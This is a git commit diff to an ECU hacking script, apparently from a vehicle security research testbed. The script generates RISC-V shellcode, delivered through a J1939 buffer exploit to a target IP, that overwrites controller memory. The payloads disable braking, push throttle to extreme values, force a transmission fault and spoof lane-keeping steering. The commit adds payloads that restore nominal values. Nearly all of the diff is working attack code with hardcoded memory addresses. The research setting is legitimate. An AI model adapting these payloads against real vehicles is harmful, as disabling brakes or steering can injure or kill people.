aea1974120148253b7cee33fe129301801ff5548
Michal Podhradsky <mpodhradsky@galois.com>
2021-06-18 10:10:12 -0700

    Updated ECU hacking logic, differentiate between scenarios

--- besspin/cyberPhys/hacking/hack-ecu.py
+++ besspin/cyberPhys/hacking/hack-ecu.py
@@ -54,6 +54,7 @@ RETURN_ADDR = 0xc00088f2
 # (gdb) p camera_ok
 # (gdb) false
 CAMERA_OK_VAL = 1
+CAMERA_OK_VAL_NOMINAL = 0
 # (gdb) p &camera_ok
 # (gdb) (_Bool *) 0xc0890352 <camera_ok>
 CAMERA_OK_ADDR = 0xc0890352
@@ -61,6 +62,7 @@ CAMERA_OK_ADDR = 0xc0890352
 # (gdb) p steering_assist
 # (gdb) 0 '\000'
 STEERING_ASSIST_VAL = 100
+STEERING_ASSIST_VAL_NOMINAL = 0
 # (gdb) p &steering_assist
 # (gdb) (uint8_t *) 0xc0890362 <steering_assist> ""
 STEERING_ASSIST_ADDR = 0xc0890362
@@ -68,6 +70,7 @@ STEERING_ASSIST_ADDR = 0xc0890362
 # (gdb) p throttle_min
 # $10 = 64
 THROTTLE_MIN_VAL = -900
+THROTTLE_MIN_VAL_NOMINAL = 64
 # (gdb) p &throttle_min
 # $11 = (int16_t *) 0xc0890364 <throttle_min>
 THROTTLE_MIN_ADDR = 0xc0890364
@@ -75,13 +78,15 @@ THROTTLE_MIN_ADDR = 0xc0890364
 # (gdb) p throttle_gain
 # $12 = 100
 THROTTLE_GAIN_VAL = 3000
+THROTTLE_GAIN_VAL_NOMINAL = 100
 # (gdb) p &throttle_gain
 # $13 = (int16_t *) 0xc089034e <throttle_gain>
 THROTTLE_GAIN_ADDR = 0xc089034e
 
 # (gdb) p brake_max
-# $14 = 510
+# $14 = 270
 BRAKE_MAX_VAL = 0
+BRAKE_MAX_VAL_NOMINAL = 270
 # (gdb) p &brake_max
 # $15 = (int16_t *) 0xc0890340 <brake_max>
 BRAKE_MAX_ADDR = 0xc0890340
@@ -89,6 +94,7 @@ BRAKE_MAX_ADDR = 0xc0890340
 # (gdb) p brake_gain
 # $17 = 100
 BRAKE_GAIN_VAL = 0
+BRAKE_GAIN_VAL_NOMINAL = 100
 # (gdb) p &brake_gain
 # $18 = (int16_t *) 0xc0890370 <brake_gain>
 BRAKE_GAIN_ADDR = 0xc0890370
@@ -98,6 +104,7 @@ BRAKE_GAIN_ADDR = 0xc0890370
 TRANSMISSION_OK_ADDR = 0xc0890366
 # Set to 0 to make transmission not OK
 TRANSMISSION_OK_VAL = 0
+TRANSMISSION_OK_VAL_NOMINAL = 1
 
 # (gdb) p &j1939_rx_buf
 # (gdb) (uint8_t (*)[256]) 0xc0890240 <j1939_rx_buf>
@@ -124,62 +131,108 @@ PGN = 60879
 DEFAULT_IP = "10.88.88.12"
 POINTER_SIZE = 8  # bytes
 
-THROTTLE_HACK = "throttle"
-BRAKE_HACK = "brake"
-GEAR_HACK = "gear"
-LKAS_HACK = "lkas"
-HACKS = [THROTTLE_HACK,BRAKE_HACK,GEAR_HACK,LKAS_HACK]
+THROTTLE = "throttle"
+BRAKE = "brake"
+GEAR = "gear"
+LKAS = "lkas"
+HACKS = [THROTTLE,BRAKE,GEAR,LKAS]
 
 j1939_hack_dir = "j1939hack"
 j1939_header = "main.h"
 
-def hack_generate_payload(hacktype):
+def hack_generate_payload(hacktype,nominal=False):
     print(f">>> Generating hack payload for the {hacktype} hack.")
-    if hacktype == THROTTLE_HACK:
-        # Set throttle_min to -900
-        # Set throttle_gain to int16_max (32767)
-        payload = [
-                    "li t3, {}\n".format(hex(THROTTLE_MIN_ADDR)), # load location of the variable
-                    "li t4, {}\n".format(hex(THROTTLE_MIN_VAL)), # load new value
-                    "sh t4, 0(t3)\n", # store new value
-                    "li t3, {}\n".format(hex(THROTTLE_GAIN_ADDR)), # load location of the variable
-                    "li t4, {}\n".format(hex(THROTTLE_GAIN_VAL)), # load new value
-                    "sh t4, 0(t3)\n", # store new value
-                    "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
-                    "ret\n", # initiate jump
-                ]
-    elif hacktype == BRAKE_HACK:
-        # Set brake_gain to 0 to disable brake
-        payload = [
-                    "li t3, {}\n".format(hex(BRAKE_GAIN_ADDR)), # load location of the variable
-                    "li t4, {}\n".format(hex(BRAKE_GAIN_VAL)), # load new value
-                    "sh t4, 0(t3)\n", # store new value
-                    "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
-                    "ret\n", # initiate jump
-                ]
-    elif hacktype == GEAR_HACK:
-        # Replace all assignments in switch statement for tmp_gear
-        # to be 'N'
-        payload = [
+    if hacktype == THROTTLE:
+        if nominal:
+            # Restore everything
+            payload = [
+                        "li t3, {}\n".format(hex(THROTTLE_MIN_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(THROTTLE_MIN_VAL_NOMINAL)), # load new value
+                        "sh t4, 0(t3)\n", # store new value
+                        "li t3, {}\n".format(hex(THROTTLE_GAIN_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(THROTTLE_GAIN_VAL_NOMINAL)), # load new value
+                        "sh t4, 0(t3)\n", # store new value
+                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                        "ret\n", # initiate jump
+                    ]
+        else:
+            # Set throttle_min to -900
+            # Set throttle_gain to int16_max (32767)
+            payload = [
+                        "li t3, {}\n".format(hex(THROTTLE_MIN_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(THROTTLE_MIN_VAL)), # load new value
+                        "sh t4, 0(t3)\n", # store new value
+                        "li t3, {}\n".format(hex(THROTTLE_GAIN_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(THROTTLE_GAIN_VAL)), # load new value
+                        "sh t4, 0(t3)\n", # store new value
+                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                        "ret\n", # initiate jump
+                    ]
+    elif hacktype == BRAKE:
+        if nominal:
+            # Restore everything
+            payload = [
+                        "li t3, {}\n".format(hex(BRAKE_GAIN_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(BRAKE_GAIN_VAL_NOMINAL)), # load new value
+                        "sh t4, 0(t3)\n", # store new value
+                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                        "ret\n", # initiate jump
+                    ]
+        else:
+            # Set brake_gain to 0 to disable brake
+            payload = [
+                        "li t3, {}\n".format(hex(BRAKE_GAIN_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(BRAKE_GAIN_VAL)), # load new value
+                        "sh t4, 0(t3)\n", # store new value
+                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                        "ret\n", # initiate jump
+                    ]
+    elif hacktype == GEAR:
+        if nominal:
+            # Restore everything
+            payload = [
                     "li t3, {}\n".format(hex(TRANSMISSION_OK_ADDR)), # load location of the variable
-                    "li t4, {}\n".format(hex(TRANSMISSION_OK_VAL)), # load new value
+                    "li t4, {}\n".format(hex(TRANSMISSION_OK_VAL_NOMINAL)), # load new value
                     "sb t4, 0(t3)\n", # store new value
                     "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
                     "ret\n", # initiate jump
                 ]
-    elif hacktype == LKAS_HACK:
-        # Set camera_ok =1
-        # Set steering_assist to some value
-        payload = [
-                    "li t3, {}\n".format(hex(CAMERA_OK_ADDR)), # load location of the variable
-                    "li t4, {}\n".format(hex(CAMERA_OK_VAL)), # load new value
-                    "sb t4, 0(t3)\n", # store new value
-                    "li t3, {}\n".format(hex(STEERING_ASSIST_ADDR)), # load location of the variable
-                    "li t4, {}\n".format(hex(STEERING_ASSIST_VAL)), # load new value
-                    "sb t4, 0(t3)\n", # store new value
-                    "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
-                    "ret\n", # initiate jump
-                ]
+        else:
+            # Replace all assignments in switch statement for tmp_gear
+            # to be 'N'
+            payload = [
+                        "li t3, {}\n".format(hex(TRANSMISSION_OK_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(TRANSMISSION_OK_VAL)), # load new value
+                        "sb t4, 0(t3)\n", # store new value
+                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                        "ret\n", # initiate jump
+                    ]
+    elif hacktype == LKAS:
+        if nominal:
+            # Restore everything
+            payload = [
+                        "li t3, {}\n".format(hex(CAMERA_OK_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(CAMERA_OK_VAL_NOMINAL)), # load new value
+                        "sb t4, 0(t3)\n", # store new value
+                        "li t3, {}\n".format(hex(STEERING_ASSIST_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(STEERING_ASSIST_VAL_NOMINAL)), # load new value
+                        "sb t4, 0(t3)\n", # store new value
+                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                        "ret\n", # initiate jump
+                    ]
+        else:
+            # Set camera_ok =1
+            # Set steering_assist to some value
+            payload = [
+                        "li t3, {}\n".format(hex(CAMERA_OK_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(CAMERA_OK_VAL)), # load new value
+                        "sb t4, 0(t3)\n", # store new value
+                        "li t3, {}\n".format(hex(STEERING_ASSIST_ADDR)), # load location of the variable
+                        "li t4, {}\n".format(hex(STEERING_ASSIST_VAL)), # load new value
+                        "sb t4, 0(t3)\n", # store new value
+                        "li ra, {}\n".format(hex(RETURN_ADDR)), # jump back
+                        "ret\n", # initiate jump
+                    ]
     else:
         print(f"Unknown hack type: {hacktype}")
         raise NotImplementedError
@@ -210,13 +263,13 @@ def hack_generate_payload(hacktype):
     return "{" + ','.join([hex(c) for c in payload]) + "}"
 
 
-def hack_generate_header(ip, port, hacktype):
+def hack_generate_header(ip, port, hacktype, nominal=False):
     """
     Generate main.h
     """
     print(">>> Generating hack header.")
     j1939_header_path = os.path.join(j1939_hack_dir, j1939_header)
-    payload = hack_generate_payload(hacktype)
+    payload = hack_generate_payload(hacktype, nominal)
 
     content = [
         "/* This file is autogenerated, do not edit */"
@@ -243,18 +296,13 @@ def main():
     parser = argparse.ArgumentParser(description='hack critical systems')
     parser.add_argument('--ip', help='target IP address', default=DEFAULT_IP)
     parser.add_argument('--port', type=int, help='target RX port', default=DEFAULT_PORT)
-    parser.add_argument('--type', help='Type of hack', choices=HACKS,default=THROTTLE_HACK)
-    parser.add_argument('--test', help='test mode (no exploit)', action='store_true')
+    parser.add_argument('--type', help='Type of hack', choices=HACKS,default=THROTTLE)
+    parser.add_argument('--test', help='Compile for x86 target', action='store_true')
+    parser.add_argument('--nominal', help='Reverts the hack to nominal values', action='store_true',default=False)
     args = parser.parse_args()
 
-    hack_generate_header(ip=args.ip, port=args.port, hacktype=args.type)
+    hack_generate_header(ip=args.ip, port=args.port, hacktype=args.type, nominal=args.nominal)
     hack_compile(test=args.test)
-
-    if args.test:
-        print("Test mode: Nothing else to be done")
-    else:
-        print("Hacking mode: Uploading over OTA update server")
-        raise NotImplementedError
 
     print("Done!")
 
